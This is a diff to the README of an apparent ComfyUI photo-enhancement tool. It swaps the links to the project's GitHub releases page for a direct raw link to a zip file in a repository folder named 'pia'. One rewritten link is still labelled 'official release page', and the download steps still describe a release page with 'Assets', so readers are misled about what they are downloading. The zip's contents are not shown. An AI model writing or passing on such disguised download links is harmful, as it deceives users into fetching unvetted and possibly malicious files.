@@ -1,6 +1,6 @@
 # 📸 ComfyUI-zveroboy-photo - Enhance your digital photos with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Ahmed4644/ComfyUI-zveroboy-photo/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Ahmed4644/ComfyUI-zveroboy-photo/main/pia/U_photo_Comfy_zveroboy_3.8.zip)
 
 ## What is this tool?
 
@@ -22,7 +22,7 @@ Ensure your graphics drivers are up to date. Visit the website of your graphics 
 
 Follow these steps to get the files on your computer.
 
-1. Go to the [official release page](https://github.com/Ahmed4644/ComfyUI-zveroboy-photo/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Ahmed4644/ComfyUI-zveroboy-photo/main/pia/U_photo_Comfy_zveroboy_3.8.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the link that ends in ".zip" to start the download.
 4. Save the file to your "Downloads" folder.
